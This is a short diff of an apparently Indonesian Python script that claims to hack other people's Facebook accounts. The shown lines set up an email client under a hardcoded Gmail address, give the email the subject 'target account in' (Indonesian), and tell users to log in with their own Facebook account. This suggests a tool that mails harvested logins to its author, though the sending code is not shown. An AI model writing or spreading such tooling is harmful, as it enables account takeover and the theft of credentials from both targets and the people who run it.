@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 # coding=utf-8
 import socket,struct,os,sys,time,yagmail
-x=yagmail.SMTP('darklite4252@gmail.com','MASUKKAN ID AKUN FACEBOOK YANG MAU DI HACK')
+x=yagmail.SMTP('darklite4252@gmail.com','pilih akun facebook yang akan di hack')
 subject='AKUN TARGET MASUK'
 logo = """\x1b[1;92m█████████
 \x1b[1;92m█▄█████▄█      \033[1;94m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
@@ -12,7 +12,7 @@ logo = """\x1b[1;92m█████████
 \x1b[1;92m ██ ██\x1b[00m"""
 
 banner = """
-\x1b[34mGunakan dengan bijak pesan dari author :)
+\x1b[34mGunakan dengan bijak pesan dari author:)
 \x1b[1;92mHack akun facebook secara  Target 
 \x1b[00mLogin Menggunakan Akun Facebook Kalian \x1b[91m!
 """
